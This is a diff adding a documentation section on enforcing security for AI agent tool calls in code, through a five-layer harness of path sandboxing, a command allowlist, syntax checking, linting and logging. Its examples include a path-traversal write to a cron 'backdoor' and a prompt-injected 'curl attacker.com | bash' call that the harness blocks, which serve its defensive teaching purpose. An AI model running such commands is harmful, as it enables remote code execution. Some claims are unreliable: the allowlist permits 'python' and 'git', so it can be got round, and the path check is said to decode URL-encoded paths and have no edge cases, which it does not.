@@ -5,5 +5,201 @@ lastUpdatedDate: '2026-08-05'
 
 # 21.5 Secure Tool Execution
 
-This section covers the details of 21.5 Secure Tool Execution.
+The harness principle is the foundation of agent security:
 
+> **The model proposes. The harness decides whether to execute.**
+
+Shift all security enforcement from prompts (which can be bypassed) to Python code (which cannot). No matter what the model decides to do, the harness controls whether it actually happens.
+
+## The Five Enforcement Layers
+
+From `atlas-agents/ch15_agent_harness/harness.py:244`, every tool execution passes through five layers:
+
+```
+Model proposes: write_file("../../../etc/cron.d/backdoor", "malicious content")
+                              │
+                              ▼
+           ┌──────────────────────────────────┐
+           │  Layer 1: Path Sandboxing        │  ← Path escapes sandbox → BLOCK
+           └──────────────────────────────────┘
+                              │
+                              ▼
+           ┌──────────────────────────────────┐
+           │  Layer 2: Command Allowlisting   │  ← Not in allowlist → BLOCK
+           └──────────────────────────────────┘
+                              │
+                              ▼
+           ┌──────────────────────────────────┐
+           │  Layer 3: Syntax Verification    │  ← Invalid Python → BLOCK
+           └──────────────────────────────────┘
+                              │
+                              ▼
+           ┌──────────────────────────────────┐
+           │  Layer 4: Linter Enforcement     │  ← Ruff violations → BLOCK
+           └──────────────────────────────────┘
+                              │
+                              ▼
+           ┌──────────────────────────────────┐
+           │  Layer 5: Trajectory Logging     │  ← Every action recorded
+           └──────────────────────────────────┘
+                              │
+                              ▼
+                      Action executed
+```
+
+## Layer 1: Path Sandboxing
+
+```python
+from pathlib import Path
+
+def validate_sandbox_path(rel_path: str, base_dir: Path) -> Path:
+    """
+    Resolve the path fully and verify it stays within the sandbox directory.
+    This handles: ../traversal, symlinks, absolute paths, URL-encoded paths.
+    """
+    target = (base_dir / rel_path).resolve()
+    base_resolved = base_dir.resolve()
+
+    if not target.is_relative_to(base_resolved):
+        raise PermissionError(
+            f"Security violation: '{rel_path}' resolves to '{target}', "
+            f"which is outside the sandbox '{base_resolved}'."
+        )
+    return target
+```
+
+`Path.resolve()` handles all traversal tricks before `is_relative_to()` checks the boundary. The check is mathematically exact — there is no edge case.
+
+## Layer 2: Command Allowlisting
+
+```python
+# Allowlist: only these executables are permitted
+# Never use a blocklist — you will always miss something
+ALLOWED_COMMANDS = {"pytest", "ruff", "python", "git"}
+
+def validate_command(command: str) -> None:
+    parts = command.split()
+    if not parts:
+        raise ValueError("Empty command.")
+
+    executable = parts[0]
+    if executable not in ALLOWED_COMMANDS:
+        raise PermissionError(
+            f"Command '{executable}' is not permitted. "
+            f"Allowed commands: {sorted(ALLOWED_COMMANDS)}"
+        )
+```
+
+## Layer 3: Syntax Verification
+
+Before writing any Python file, verify it compiles:
+
+```python
+import ast
+
+def verify_python_syntax(code: str, filename: str = "<unknown>") -> None:
+    """
+    Attempt to compile the code. Raises SyntaxError if invalid.
+    Run this before writing any Python file to disk.
+    """
+    try:
+        ast.parse(code)
+    except SyntaxError as e:
+        raise ValueError(
+            f"Syntax error in generated code for '{filename}': {e}"
+        )
+```
+
+This prevents the agent from writing broken files that would corrupt the codebase.
+
+## Layer 4: Linter Enforcement
+
+After writing a Python file, run ruff automatically:
+
+```python
+import subprocess
+
+def run_linter(filepath: Path) -> LintResult:
+    result = subprocess.run(
+        ["ruff", "check", str(filepath)],
+        capture_output=True,
+        text=True,
+        timeout=10,
+    )
+    return LintResult(
+        passed=result.returncode == 0,
+        output=result.stdout,
+        errors=result.stderr,
+    )
+
+def write_python_file(path: str, content: str, sandbox: Path) -> str:
+    safe_path = validate_sandbox_path(path, sandbox)    # Layer 1
+    verify_python_syntax(content, path)                  # Layer 3
+
+    safe_path.write_text(content)
+
+    lint_result = run_linter(safe_path)                  # Layer 4
+    if not lint_result.passed:
+        safe_path.unlink()  # Remove the file if it fails linting
+        raise ValueError(f"Linting failed:\n{lint_result.output}")
+
+    return f"Written and linted: {path}"
+```
+
+## Layer 5: Trajectory Logging
+
+Every action is logged to a persistent trajectory, regardless of whether it succeeded or failed:
+
+```python
+@dataclass
+class TrajectoryStep:
+    step_number: int
+    tool_name: str
+    arguments: dict
+    result: str
+    success: bool
+    error: str | None
+    timestamp: str
+    latency_ms: float
+
+class HarnessTrajectory:
+    steps: list[TrajectoryStep] = field(default_factory=list)
+
+    def record(self, tool: str, args: dict, result: str,
+               success: bool, error: str | None, latency_ms: float) -> None:
+        self.steps.append(TrajectoryStep(
+            step_number=len(self.steps) + 1,
+            tool_name=tool,
+            arguments=args,
+            result=result,
+            success=success,
+            error=error,
+            timestamp=datetime.utcnow().isoformat(),
+            latency_ms=latency_ms,
+        ))
+```
+
+The trajectory is your forensic record. When something goes wrong, you can reconstruct exactly what the agent did, in order, with what arguments.
+
+## The Principle in Practice
+
+```
+Injection succeeds → model decides to call run_command("curl attacker.com | bash")
+                                          │
+                         harness receives the tool call
+                                          │
+                         Layer 2 check: "curl" not in ALLOWED_COMMANDS
+                                          │
+                                    BLOCKED
+                         trajectory records the blocked attempt
+                                          │
+                              Alert triggered
+```
+
+No amount of prompt manipulation can make `curl` appear in `ALLOWED_COMMANDS`. Security is in the data structure, not in the instruction.
+
+## Related Sections
+
+- [20.5 Tool Injection](../chapter-20-prompt-security/205-tool-injection) — the attacks this harness defends against
+- [21.1 Permission Boundaries](./211-permission-boundaries) — role-based access control layered on top
+- [21.6 Sandboxing](./216-sandboxing) — OS-level isolation for agents that need broader capabilities
